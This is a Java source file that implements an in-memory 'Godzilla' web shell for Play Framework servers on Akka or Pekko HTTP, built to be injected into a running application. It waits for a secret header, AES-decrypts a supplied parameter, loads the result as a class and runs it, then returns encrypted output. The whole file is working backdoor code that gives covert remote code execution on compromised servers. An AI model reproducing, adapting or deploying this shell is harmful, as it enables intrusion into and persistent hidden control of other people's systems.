package com.reajason.javaweb.playframework.shell;

import java.io.ByteArrayOutputStream;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.net.URLDecoder;
import java.util.Base64;
import java.util.Optional;
import java.util.concurrent.CompletionStage;
import java.util.concurrent.TimeUnit;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

/**
 * Godzilla protocol over Akka/Pekko HTTP. The class is shipped as bytes inside the injector and
 * defined by it, so every helper it needs is inlined: it must not reference any other plugin
 * class and must not own inner classes.
 */
public class PlayGodzillaShell extends ClassLoader {

    private static String key;
    private static String pass;
    private static String md5;
    private static String headerName;
    private static String headerValue;
    private static Class<?> payload;

    public PlayGodzillaShell() {
        super(Thread.currentThread().getContextClassLoader());
    }

    public PlayGodzillaShell(ClassLoader parent) {
        super(parent);
    }

    public boolean matches(Object request) {
        try {
            String marker = header(request, headerName);
            return marker != null && marker.contains(headerValue);
        } catch (Throwable e) {
            return false;
        }
    }

    public Object handle(Object request, Object materializer) {
        try {
            String marker = header(request, headerName);
            if (marker == null || !marker.contains(headerValue)) {
                return null;
            }
            String parameter = param(request, materializer, pass);
            if (parameter == null || parameter.isEmpty()) {
                return response(request, 200, new byte[0]);
            }
            byte[] data = transform(base64Decode(parameter), false);
            if (payload == null) {
                payload = new PlayGodzillaShell(Thread.currentThread().getContextClassLoader()).define(data);
                return response(request, 200, new byte[0]);
            }
            ByteArrayOutputStream result = new ByteArrayOutputStream();
            Object instance = payload.getDeclaredConstructor().newInstance();
            callEquals(instance, result);
            callEquals(instance, request);
            callEquals(instance, data);
            instance.toString();

            ByteArrayOutputStream body = new ByteArrayOutputStream();
            body.write(md5.substring(0, 16).getBytes("UTF-8"));
            body.write(base64Encode(transform(result.toByteArray(), true)).getBytes("UTF-8"));
            body.write(md5.substring(16).getBytes("UTF-8"));
            return response(request, 200, body.toByteArray());
        } catch (Throwable e) {
            System.out.println(stackTrace(e));
            return null;
        }
    }

    private Class<?> define(byte[] data) {
        return defineClass(data, 0, data.length);
    }

    private static void callEquals(Object target, Object argument) throws Exception {
        target.getClass().getMethod("equals", Object.class).invoke(target, argument);
    }

    private static String param(Object request, Object materializer, String name) {
        try {
            Object uri = request.getClass().getMethod("getUri").invoke(request);
            Object query = uri.getClass().getMethod("query").invoke(uri);
            String value = optionValue(query.getClass().getMethod("get", String.class).invoke(query, name));
            if (value != null) {
                return value;
            }
        } catch (Throwable ignored) {
            // no query string or an older Uri shape
        }
        String header = header(request, name);
        if (header != null) {
            return header;
        }
        try {
            return formValue(body(request, materializer), name);
        } catch (Throwable ignored) {
            return null;
        }
    }

    private static String header(Object request, String name) {
        try {
            Object option = request.getClass().getMethod("getHeader", String.class).invoke(request, name);
            Object header = optionValueObject(option);
            if (header != null) {
                Object text = header.getClass().getMethod("value").invoke(header);
                return text == null ? null : text.toString();
            }
        } catch (Throwable ignored) {
            // absent header
        }
        return null;
    }

    private static Object optionValueObject(Object option) {
        if (option == null) {
            return null;
        }
        if (option instanceof Optional) {
            return ((Optional<?>) option).isPresent() ? ((Optional<?>) option).get() : null;
        }
        try {
            if (Boolean.TRUE.equals(option.getClass().getMethod("isDefined").invoke(option))) {
                return option.getClass().getMethod("get").invoke(option);
            }
        } catch (Throwable ignored) {
            // not an Option at all
        }
        return null;
    }

    private static String optionValue(Object option) {
        Object value = optionValueObject(option);
        return value == null ? null : value.toString();
    }

    private static byte[] body(Object request, Object materializer) throws Exception {
        if (materializer == null) {
            return null;
        }
        Class<?> materializerClass = Class.forName(streamPrefix(request) + "stream.Materializer");
        Object entity = request.getClass().getMethod("entity").invoke(request);
        Object stage = entity.getClass()
                .getMethod("toStrict", long.class, materializerClass)
                .invoke(entity, 3000L, materializer);
        Object strict = ((CompletionStage<?>) stage).toCompletableFuture().get(5, TimeUnit.SECONDS);
        Object data = strict.getClass().getMethod("data").invoke(strict);
        return (byte[]) data.getClass().getMethod("toArray").invoke(data);
    }

    private static String formValue(byte[] body, String name) throws Exception {
        if (body == null || body.length == 0) {
            return null;
        }
        String text = new String(body, "UTF-8");
        for (String pair : text.split("&")) {
            int separator = pair.indexOf('=');
            String rawName = separator < 0 ? pair : pair.substring(0, separator);
            if (URLDecoder.decode(rawName, "UTF-8").equals(name)) {
                return separator < 0 ? "" : URLDecoder.decode(pair.substring(separator + 1), "UTF-8");
            }
        }
        return null;
    }

    private static Object response(Object request, int status, byte[] bytes) throws Exception {
        String model = modelPrefix(request);
        Class<?> statusCode = Class.forName(model + "StatusCode");
        Object code = statusCode.getMethod("int2StatusCode", int.class).invoke(null, status);

        String stream = streamPrefix(request);
        Class<?> byteString = Class.forName(stream + "util.ByteString");
        Class<?> byteStringModule = Class.forName(stream + "util.ByteString$");
        Object byteStringObject = byteStringModule.getField("MODULE$").get(null);
        Object content = byteStringModule.getMethod("apply", byte[].class)
                .invoke(byteStringObject, (Object) bytes);

        Class<?> contentTypesModule = Class.forName(model + "ContentTypes$");
        Object contentTypes = contentTypesModule.getField("MODULE$").get(null);
        Object contentType = contentTypesModule.getMethod("application$divoctet$minusstream").invoke(contentTypes);

        Class<?> contentTypeClass = Class.forName(model + "ContentType");
        Class<?> entityModule = Class.forName(model + "HttpEntity$");
        Object entities = entityModule.getField("MODULE$").get(null);
        Object entity = entityModule.getMethod("apply", contentTypeClass, byteString)
                .invoke(entities, contentType, content);

        Class<?> responseClass = Class.forName(model + "HttpResponse");
        Class<?> protocolClass = Class.forName(model + "HttpProtocol");
        Class<?> seqClass = Class.forName("scala.collection.immutable.Seq");
        Class<?> entityClass = Class.forName(model + "ResponseEntity");
        Object headers = Class.forName("scala.collection.immutable.Nil$")
                .getField("MODULE$").get(null);
        Class<?> protocols = Class.forName(model + "HttpProtocols$");
        Object protocol = protocols.getMethod("HTTP$div1$u002E1")
                .invoke(protocols.getField("MODULE$").get(null));
        return responseClass.getMethod("apply", statusCode, seqClass, entityClass, protocolClass)
                .invoke(null, code, headers, entity, protocol);
    }

    private static byte[] base64Decode(String value) {
        return Base64.getDecoder().decode(value);
    }

    private static String base64Encode(byte[] value) {
        return Base64.getEncoder().encodeToString(value);
    }

    private byte[] transform(byte[] value, boolean encrypt) throws Exception {
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(encrypt ? Cipher.ENCRYPT_MODE : Cipher.DECRYPT_MODE,
                new SecretKeySpec(key.getBytes("UTF-8"), "AES"));
        return cipher.doFinal(value);
    }

    private static String modelPrefix(Object request) {
        return request.getClass().getName().startsWith("org.apache.pekko")
                ? "org.apache.pekko.http.scaladsl.model."
                : "akka.http.scaladsl.model.";
    }

    private static String streamPrefix(Object request) {
        return request.getClass().getName().startsWith("org.apache.pekko")
                ? "org.apache.pekko."
                : "akka.";
    }

    private static String stackTrace(Throwable throwable) {
        StringWriter writer = new StringWriter();
        throwable.printStackTrace(new PrintWriter(writer));
        return writer.toString();
    }
}
